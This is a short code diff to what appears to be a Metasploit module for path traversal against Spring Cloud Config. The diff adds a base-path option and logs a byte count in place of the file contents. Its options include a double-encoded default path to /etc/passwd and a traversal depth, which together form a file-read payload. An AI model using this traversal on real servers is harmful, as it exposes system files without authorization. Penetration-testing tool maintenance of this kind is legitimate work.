@@ -35,6 +35,7 @@ class MetasploitModule < Msf::Auxiliary
     register_options(
       [
         Opt::RPORT(8888),
+        OptString.new('TARGETURI', [true, "The base path to Spring Cloud Config installation", '/']),
         OptString.new('FILEPATH', [true, "The path to the file to read", 'etc%252Fpasswd']),
         OptInt.new('DEPTH', [ true, 'Depth for Path Traversal', 11 ])
       ])
@@ -55,7 +56,7 @@ class MetasploitModule < Msf::Auxiliary
       return
     end
 
-    vprint_good("#{peer} - #{res.body}")
+    vprint_good("#{peer} - Downloaded #{res.body.length} bytes")
     path = store_loot(
       'springcloud.traversal',
       'text/plain',
